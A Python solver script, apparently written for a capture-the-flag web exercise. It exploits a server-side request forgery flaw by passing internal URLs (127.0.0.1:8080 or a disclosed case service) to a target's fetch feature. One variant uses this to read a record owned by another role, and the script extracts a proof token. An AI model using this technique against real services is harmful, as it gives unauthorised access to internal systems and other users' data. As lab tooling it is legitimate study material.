#!/usr/bin/env python3
"""Solve disclosed web fetch targets, including internal case-service variants."""

from __future__ import annotations

import argparse
from datetime import datetime, timezone
import hashlib
import json
from pathlib import Path
import re
import sys
from urllib.parse import urlencode, urljoin, urlsplit, urlunsplit
from urllib.request import Request, urlopen
from urllib.error import HTTPError

from inspect_target import normalize_url, origin


MAX_BODY_BYTES = 2 * 1024 * 1024
PROOF_RE = re.compile(rb"\bproof[_-][A-Za-z0-9_-]{12,}\b")


def get(url: str, allowed_origin: tuple[str, str, int]) -> tuple[int, bytes]:
    normalized = normalize_url(url)
    if origin(normalized) != allowed_origin:
        raise ValueError(f"refusing off-origin feature URL: {normalized}")
    request = Request(
        normalized,
        headers={"User-Agent": "HuntressCTF-Web-Inspector/1.0", "Accept": "*/*"},
        method="GET",
    )
    try:
        with urlopen(request, timeout=15) as response:
            return response.status, response.read(MAX_BODY_BYTES + 1)
    except HTTPError as exc:
        return exc.code, exc.read(MAX_BODY_BYTES + 1)


def main() -> int:
    parser = argparse.ArgumentParser(
        description="Use a disclosed secondary route as the destination of the target's fetch feature."
    )
    parser.add_argument("target", help="absolute target URL returned by the current attempt")
    parser.add_argument("--internal-host", default="127.0.0.1")
    parser.add_argument("--internal-port", type=int, default=8080)
    parser.add_argument("--url-parameter", default="url")
    parser.add_argument("--output-dir", type=Path)
    args = parser.parse_args()
    if not (1 <= args.internal_port <= 65535):
        parser.error("--internal-port must be between 1 and 65535")

    try:
        target = normalize_url(args.target)
        allowed_origin = origin(target)
        host = urlsplit(target).hostname or "target"
        timestamp = datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%SZ")
        output_dir = args.output_dir or (
            Path("web-tools/evidence") / f"{host}-internal-fetch-{timestamp}"
        )
        output_dir.mkdir(parents=True, exist_ok=True)

        clues_url = normalize_url(urljoin(target, "/api/clues"))
        clues_status, clues_body = get(clues_url, allowed_origin)
        if clues_status != 200:
            raise RuntimeError(f"route clues returned HTTP {clues_status}")
        clues = json.loads(clues_body.decode("utf-8"))
        if not isinstance(clues, dict):
            raise ValueError("route clues are not a JSON object")
        feature_route = clues.get("feature_route")

        # The Trust Transit variant joins a public fetch route to a separately
        # disclosed internal case service, then uses its public case directory
        # to select a record owned by another role.
        topology_route = clues.get("topology_route")
        case_directory_route = clues.get("case_directory_route")
        if all(
            isinstance(value, str) and value
            for value in (feature_route, topology_route, case_directory_route)
        ):
            feature_url = normalize_url(urljoin(target, feature_route))
            if origin(feature_url) != allowed_origin:
                raise ValueError("feature route leaves the assigned target")

            topology_url = normalize_url(urljoin(target, topology_route))
            cases_url = normalize_url(urljoin(target, case_directory_route))
            topology_status, topology_body = get(topology_url, allowed_origin)
            cases_status, cases_body = get(cases_url, allowed_origin)
            if topology_status != 200 or cases_status != 200:
                raise RuntimeError(
                    f"topology/case directory returned HTTP {topology_status}/{cases_status}"
                )
            topology = json.loads(topology_body.decode("utf-8"))
            directory = json.loads(cases_body.decode("utf-8"))
            service_url = topology.get("case_service")
            cases = directory.get("cases")
            current_role = clues.get("current_role")
            if not isinstance(service_url, str) or not isinstance(cases, list):
                raise ValueError("topology or case directory has an unexpected shape")
            candidates = [
                case for case in cases
                if isinstance(case, dict)
                and case.get("owner") != current_role
                and case.get("id") is not None
            ]
            if not candidates:
                raise ValueError("case directory contains no record owned by another role")
            case_id = candidates[0]["id"]

            service = urlsplit(service_url)
            if service.scheme != "http" or not service.hostname:
                raise ValueError("topology did not disclose an HTTP case service")
            internal_query = urlencode({"id": case_id})
            internal_url = urlunsplit(
                (service.scheme, service.netloc, service.path, internal_query, "")
            )

            # The fetch route reports its required query parameter on an
            # empty request, so follow the API-provided name rather than
            # assuming it is always called "target".
            status, feature_body = get(feature_url, allowed_origin)
            parameter = "target"
            try:
                error_contract = json.loads(feature_body.decode("utf-8"))
                if isinstance(error_contract.get("query_parameter"), str):
                    parameter = error_contract["query_parameter"]
            except (UnicodeDecodeError, json.JSONDecodeError, AttributeError):
                pass
            query = urlencode({parameter: internal_url})
            request_url = feature_url + ("&" if "?" in feature_url else "?") + query
            status, body = get(request_url, allowed_origin)
            body = body[:MAX_BODY_BYTES]
            (output_dir / "clues.body").write_bytes(clues_body)
            (output_dir / "topology.body").write_bytes(topology_body)
            (output_dir / "case-directory.body").write_bytes(cases_body)
            (output_dir / "feature-response.body").write_bytes(body)
            proof_match = PROOF_RE.search(body)
            proof = proof_match.group(0).decode("ascii") if proof_match else None
            report = {
                "target": target,
                "created_at": datetime.now(timezone.utc).isoformat(),
                "feature_url": feature_url,
                "internal_url": internal_url,
                "selected_case": {"id": case_id, "owner": candidates[0].get("owner")},
                "request_url": request_url,
                "feature_status": status,
                "responses": {
                    "clues": {
                        "file": "clues.body",
                        "bytes": len(clues_body),
                        "sha256": hashlib.sha256(clues_body).hexdigest(),
                    },
                    "topology": {
                        "file": "topology.body",
                        "bytes": len(topology_body),
                        "sha256": hashlib.sha256(topology_body).hexdigest(),
                    },
                    "case_directory": {
                        "file": "case-directory.body",
                        "bytes": len(cases_body),
                        "sha256": hashlib.sha256(cases_body).hexdigest(),
                    },
                    "feature": {
                        "file": "feature-response.body",
                        "bytes": len(body),
                        "sha256": hashlib.sha256(body).hexdigest(),
                    },
                },
                "proof": proof,
                "request_policy": {
                    "same_origin_only_for_direct_requests": True,
                    "internal_destination_disclosed_by_topology": True,
                    "record_selected_from_public_case_directory": True,
                },
            }
            report_path = output_dir / "report.json"
            report_path.write_text(
                json.dumps(report, indent=2, ensure_ascii=False) + "\n", encoding="utf-8"
            )
            print(json.dumps({"proof": proof, "report": str(report_path)}, indent=2))
            return 0 if proof else 1

        secondary_route = clues.get("secondary_route")
        if not all(
            isinstance(value, str) and value
            for value in (feature_route, secondary_route)
        ):
            raise ValueError("route clues lack feature_route or secondary_route")

        feature_url = normalize_url(urljoin(target, feature_route))
        if origin(feature_url) != allowed_origin:
            raise ValueError("feature route leaves the assigned target")
        if not secondary_route.startswith("/"):
            secondary_route = "/" + secondary_route
        internal_url = (
            f"http://{args.internal_host}:{args.internal_port}{secondary_route}"
        )
        request_url = (
            feature_url
            + "?"
            + urlencode({args.url_parameter: internal_url})
        )
        status, body = get(request_url, allowed_origin)
        body = body[:MAX_BODY_BYTES]
        (output_dir / "clues.body").write_bytes(clues_body)
        (output_dir / "feature-response.body").write_bytes(body)
        proof_match = PROOF_RE.search(body)
        proof = proof_match.group(0).decode("ascii") if proof_match else None
        report = {
            "target": target,
            "created_at": datetime.now(timezone.utc).isoformat(),
            "feature_url": feature_url,
            "internal_url": internal_url,
            "request_url": request_url,
            "feature_status": status,
            "responses": {
                "clues": {
                    "file": "clues.body",
                    "bytes": len(clues_body),
                    "sha256": hashlib.sha256(clues_body).hexdigest(),
                },
                "feature": {
                    "file": "feature-response.body",
                    "bytes": len(body),
                    "sha256": hashlib.sha256(body).hexdigest(),
                },
            },
            "proof": proof,
            "request_policy": {
                "same_origin_only_for_direct_requests": True,
                "internal_destination_derived_from_secondary_route": True,
            },
        }
        report_path = output_dir / "report.json"
        report_path.write_text(
            json.dumps(report, indent=2, ensure_ascii=False) + "\n", encoding="utf-8"
        )
        print(json.dumps({"proof": proof, "report": str(report_path)}, indent=2))
        return 0 if proof else 1
    except (
        ValueError,
        RuntimeError,
        OSError,
        UnicodeDecodeError,
        json.JSONDecodeError,
    ) as exc:
        print(json.dumps({"error": str(exc)}), file=sys.stderr)
        return 1


if __name__ == "__main__":
    sys.exit(main())
